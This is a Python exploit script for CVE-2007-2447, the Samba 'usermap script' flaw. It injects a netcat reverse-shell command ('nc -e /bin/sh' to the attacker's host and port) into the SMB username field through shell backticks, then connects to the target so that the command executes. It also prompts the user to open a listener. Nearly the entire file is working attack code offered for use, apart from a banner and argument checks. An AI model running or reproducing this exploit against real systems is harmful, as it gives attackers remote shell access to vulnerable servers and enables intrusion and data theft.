from sys import argv
from smb.SMBConnection import SMBConnection


def exploit(rhost, rport, lhost, lport):
    payload = "nc -e /bin/sh " + lhost + " " + lport
    username = "./=`nohup " + payload + "`"
    conn = SMBConnection(username, "", "", "")
    print(
        f"[+] Start a Netcat listener in a new window (nc -lvnp {lport}) and press any key.")
    p = input()
    print("[+] Connecting to smb.")
    try:
        conn.connect(rhost, int(rport), timeout=1)
    except:
        print("[+] Payload executed Successfully :)\n[+] Check your Netcat listener.")


banner = '''


                     _                                                       
                    | |                                                      
 ___  __ _ _ __ ___ | |__   __ _   _   _ ___  ___ _ __ _ __ ___   __ _ _ __  
/ __|/ _` | '_ ` _ \| '_ \ / _` | | | | / __|/ _ \ '__| '_ ` _ \ / _` | '_ \ 
\__ \ (_| | | | | | | |_) | (_| | | |_| \__ \  __/ |  | | | | | | (_| | |_) |
|___/\__,_|_| |_| |_|_.__/ \__,_|  \__,_|___/\___|_|  |_| |_| |_|\__,_| .__/ 
                                                                      | |    
                                                                      |_|
                                                         @Alien0ne       
                                                           '''


if len(argv) != 5:
    print(f"Usage:\n\t{argv[0]} <rhost> <rport> <lhost> <lport> ")
    exit()
try:
    port = int(argv[4])
    if not (1024 < port < 65536):
        raise ValueError
except ValueError:
    print("Port must be an number between 1025 and 65535.")
    exit()

print(banner)
print(
    f"           Usage:\n\t\t  {argv[0]} <rhost> <rport> <lhost> <lport> \n\n\n")
print("[+] CVE-2007-2447 - Samba usermap script")
print("[+] Creating payload.")
rhost = argv[1]
rport = argv[2]
lhost = argv[3]
lport = argv[4]
exploit(rhost, rport, lhost, lport)
